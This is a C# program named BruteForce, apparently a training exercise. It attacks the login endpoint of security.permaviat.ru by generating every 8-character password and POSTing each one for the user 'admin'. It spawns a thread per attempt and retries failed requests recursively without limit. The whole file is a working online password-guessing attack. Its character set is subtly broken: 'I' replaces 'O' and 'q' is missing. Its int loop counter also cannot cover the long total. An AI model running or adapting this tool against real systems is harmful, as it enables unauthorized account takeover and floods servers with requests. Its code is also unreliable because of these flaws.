using System.Globalization;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection.Metadata;
using System.Text;

namespace BruteForce
{
    internal class Program
    {
        public static string InvalidToken = "4439f14af03c1454a886a3b24101197e";
        public static string Abc = "ABCDEFGHIJKLMNIORSTUVWXYZabcdefghijklmnoprstuvwxyz0123456789";
        public delegate void Passwordhandler(string password);
        public static DateTime Start;

        static void Main(string[] args)
        {
            Start = DateTime.Now;
            CreatePassword(8, CheckPassword);
        }

        public static void SignIn(string password)
        {
            try
            {
                string url = "http://security.permaviat.ru/ajax/login_user.php";

                HttpWebRequest Request = (HttpWebRequest)WebRequest.Create(url);
                Request.Method = "POST";
                Request.ContentType = "application/x-www-form-urlencoded";

                string PostData = $"login=admin&password={password}";
                byte[] Data = Encoding.ASCII.GetBytes(PostData);
                Request.ContentLength = Data.Length;

                using (var stream = Request.GetRequestStream())
                    stream.Write(Data, 0, Data.Length);

                HttpWebResponse Response = (HttpWebResponse)Request.GetResponse();

                string ResponseFromServer = new StreamReader(Response.GetResponseStream()).ReadToEnd();
                string Status = ResponseFromServer == InvalidToken ? "FALSE" : "TRUE";

                TimeSpan Delta = DateTime.Now.Subtract(Start);
                Console.WriteLine(Delta.ToString(@"hh\:mm\:ss") + $": {password} - {Status}");
            }
            catch (Exception exp)
            {
                TimeSpan Delta = DateTime.Now.Subtract(Start);
                Console.WriteLine(Delta.ToString(@"hh\:mm\:ss") + $": {password} - ошибка");
                SignIn(password);
            }
        }

        public static void CheckPassword(string password)
        {
            Thread thread = new Thread(() => SignIn(password));
            thread.Start();
        }

        public static void CreatePassword(int numberChar, Action<string> processPassword)
        {
            char[] chars = Abc.ToCharArray();
            int[] indices = new int[numberChar];
            long totalCombinations = (long)Math.Pow(chars.Length, numberChar);

            for (int i = 0; i < totalCombinations; i++)
            {
                StringBuilder password = new StringBuilder(numberChar);

                for (int j = 0; j < numberChar; j++)
                    password.Append(chars[indices[j]]);

                processPassword(password.ToString());

                for (int j = numberChar - 1; j >= 0; j--)
                {
                    indices[j]++;
                    if (indices[j] < chars.Length)
                        break;
                    indices[j] = 0;
                }
            }
        }
    }
}